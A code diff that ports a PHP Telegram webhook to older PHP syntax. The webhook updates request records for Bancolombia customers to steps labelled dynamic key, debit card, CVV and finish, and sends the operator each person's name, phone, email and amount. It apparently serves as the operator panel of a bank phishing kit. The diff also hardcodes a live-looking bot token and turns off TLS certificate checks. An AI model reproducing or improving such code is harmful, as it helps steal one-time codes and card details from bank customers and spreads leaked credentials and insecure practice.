@@ -5,13 +5,13 @@ header("Content-Type: application/json; charset=utf-8");
 
 $raw = file_get_contents("php://input");
 if ($raw === false || $raw === '') {
-    echo json_encode(['ok' => true]);
+    echo json_encode(array('ok' => true));
     exit;
 }
 
 $update = json_decode($raw, true);
 if (!is_array($update)) {
-    echo json_encode(['ok' => true]);
+    echo json_encode(array('ok' => true));
     exit;
 }
 
@@ -19,7 +19,12 @@ require_once __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';
 
 $DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
 $envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
-$token  = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
+$token  = $DEFAULT_BOT_TOKEN_OPS;
+if (is_string($envBot)) {
+    if (trim($envBot) !== '') {
+        $token = $envBot;
+    }
+}
 
 function wh_log($line) {
     try {
@@ -29,21 +34,21 @@ function wh_log($line) {
             @fwrite($fp, gmdate('Y-m-d\TH:i:s\Z') . " " . $line . "\n");
             @fclose($fp);
         }
-    } catch (Throwable $_) { /* ignore */ }
+    } catch (Throwable $e) { /* ignore */ }
 }
 
 function answerCallback($cbId, $text = 'OK', $showAlert = false) {
     global $token;
-    $payload = json_encode([
+    $payload = json_encode(array(
         'callback_query_id' => $cbId,
         'text'              => $text,
         'show_alert'        => $showAlert,
-    ]);
+    ));
     $ch = curl_init("https://api.telegram.org/bot" . $token . "/answerCallbackQuery");
     if (!$ch) return false;
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
@@ -51,23 +56,25 @@ function answerCallback($cbId, $text = 'OK', $showAlert = false) {
     $out  = curl_exec($ch);
     $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
-    return ['ok' => ($code >= 200 && $code < 300), 'code' => $code, 'body' => $out];
+    return array('ok' => ($code >= 200 && $code < 300), 'code' => $code, 'body' => $out);
 }
 
 function tgSend($chatId, $text, $reply_markup = null, $parse_mode = 'HTML') {
     global $token;
-    $body = ['chat_id' => $chatId, 'text' => $text];
+    $body = array('chat_id' => $chatId, 'text' => $text);
     if ($parse_mode) {
         $body['parse_mode']               = $parse_mode;
         $body['disable_web_page_preview'] = true;
     }
-    if ($reply_markup) $body['reply_markup'] = $reply_markup;
+    if ($reply_markup) {
+        $body['reply_markup'] = $reply_markup;
+    }
     $payload = json_encode($body);
     $ch = curl_init("https://api.telegram.org/bot" . $token . "/sendMessage");
     if (!$ch) return false;
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
@@ -75,20 +82,20 @@ function tgSend($chatId, $text, $reply_markup = null, $parse_mode = 'HTML') {
     $out  = curl_exec($ch);
     $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
-    return ['ok' => ($code >= 200 && $code < 300), 'code' => $code, 'body' => $out];
+    return array('ok' => ($code >= 200 && $code < 300), 'code' => $code, 'body' => $out);
 }
 
-$remote = $_SERVER['REMOTE_ADDR']    ?? 'unknown';
-$ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+$remote = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';
+$ua     = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'unknown';
 wh_log("START remote=" . $remote . " ua=" . substr($ua, 0, 120) . " rawlen=" . strlen($raw));
 
 if (isset($update['callback_query']) && is_array($update['callback_query'])) {
     $cb    = $update['callback_query'];
-    $cbId  = $cb['id'] ?? '';
-    $data  = $cb['data'] ?? '';
-    $from  = $cb['from']['id'] ?? 0;
-    $chat  = $cb['message']['chat']['id'] ?? 0;
-    $msgId = $cb['message']['message_id'] ?? 0;
+    $cbId  = isset($cb['id']) ? $cb['id'] : '';
+    $data  = isset($cb['data']) ? $cb['data'] : '';
+    $from  = isset($cb['from']['id']) ? $cb['from']['id'] : 0;
+    $chat  = isset($cb['message']['chat']['id']) ? $cb['message']['chat']['id'] : 0;
+    $msgId = isset($cb['message']['message_id']) ? $cb['message']['message_id'] : 0;
 
     wh_log("CB data=" . var_export($data, true) . " from=" . $from . " chat=" . $chat . " cbId=" . $cbId);
 
@@ -128,7 +135,7 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
                        AND banco = 'Bancolombia'
                        AND LEFT(request_id,4) = 'BCO_'"
                 );
-                $upd->execute([$estado, $request_id]);
+                $upd->execute(array($estado, $request_id));
                 $rowsAffected = (int)$upd->rowCount();
 
                 $row = null;
@@ -136,18 +143,18 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
                     "SELECT request_id, `key`, numero_cuenta, monto, banco, estado, nombre, telefono, correo
                      FROM solicitudes WHERE BINARY request_id = ? LIMIT 1"
                 );
-                $sel->execute([$request_id]);
+                $sel->execute(array($request_id));
                 $row = $sel->fetch(PDO::FETCH_ASSOC);
-                if ($row) {
-                    $foundBanco = (string)($row['banco'] ?? '');
-                    $foundRid   = (string)($row['request_id'] ?? '');
+                if (is_array($row)) {
+                    $foundBanco = isset($row['banco']) ? (string)$row['banco'] : '';
+                    $foundRid   = isset($row['request_id']) ? (string)$row['request_id'] : '';
                 }
                 wh_log(
                     "UPDATE estado=" . $estado . " request_id=" . var_export($request_id, true) .
                     " rowsAffected=" . $rowsAffected . " foundBanco=" . $foundBanco . " foundRid=" . $foundRid
                 );
 
-                $labelMap = [
+                $labelMap = array(
                     'opcion_1'  => "[DINAMICA]",
                     'opcion_2'  => "[TARJETA DEBITO]",
                     'opcion_3'  => "[ERROR DINAMICA]",
@@ -159,18 +166,17 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
                     'opcion_9'  => "[ERROR DINAMICA detalle]",
                     'opcion_10' => "[FINALIZAR]",
                     'opcion_55' => "[CVV]",
-                ];
-                $lbl = $labelMap[$estado] ?? strtoupper(str_replace('_', ' ', $estado));
+                );
+                $lbl = isset($labelMap[$estado]) ? $labelMap[$estado] : strtoupper(str_replace('_', ' ', $estado));
 
-                $lines = ["OK <b>Estado actualizado:</b> " . $lbl];
-                if ($row) {
-                    if (!empty($row['request_id']))      $lines[] = "ID Request: " . htmlspecialchars($row['request_id'], ENT_QUOTES, 'UTF-8');
-                    if (!empty($row['banco']))           $lines[] = "Banco: "      . htmlspecialchars($row['banco'], ENT_QUOTES, 'UTF-8');
-                    if (!empty($row['numero_cuenta']))   $lines[] = "Celular: "    . htmlspecialchars($row['numero_cuenta'], ENT_QUOTES, 'UTF-8');
-                    if (!empty($row['monto']))           $lines[] = "Monto: "      . htmlspecialchars($row['monto'], ENT_QUOTES, 'UTF-8');
-                    if (!empty($row['nombre']))          $lines[] = "Nombre: "     . htmlspecialchars($row['nombre'], ENT_QUOTES, 'UTF-8');
-                    if (!empty($row['telefono']))        $lines[] = "Telefono: "   . htmlspecialchars($row['telefono'], ENT_QUOTES, 'UTF-8');
-                    if (!empty($row['correo']))          $lines[] = "Correo: "     . htmlspecialchars($row['correo'], ENT_QUOTES, 'UTF-8');
+                $lines = array("OK <b>Estado actualizado:</b> " . $lbl);
+                if (is_array($row)) {
+                    if (!empty($row['request_id']))   $lines[] = "ID Request: " . htmlspecialchars($row['request_id'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['banco']))        $lines[] = "Banco: "       . htmlspecialchars($row['banco'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['monto']))        $lines[] = "Monto: "       . htmlspecialchars($row['monto'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['nombre']))       $lines[] = "Nombre: "      . htmlspecialchars($row['nombre'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['telefono']))     $lines[] = "Telefono: "    . htmlspecialchars($row['telefono'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['correo']))       $lines[] = "Correo: "      . htmlspecialchars($row['correo'], ENT_QUOTES, 'UTF-8');
                 }
 
                 if ($chat) {
@@ -181,7 +187,9 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
             } catch (Throwable $e) {
                 $msg = $e->getMessage();
                 wh_log("ERROR " . $msg);
-                if ($cbId) answerCallback($cbId, "Error: " . substr($msg, 0, 120), true);
+                if ($cbId) {
+                    answerCallback($cbId, "Error: " . substr($msg, 0, 120), true);
+                }
                 error_log("TG webhook error: " . $msg);
                 $answered = true;
             }
@@ -193,6 +201,6 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
     }
 }
 
-echo json_encode(['ok' => true]);
+echo json_encode(array('ok' => true));
 wh_log("END output_sent");
 exit;
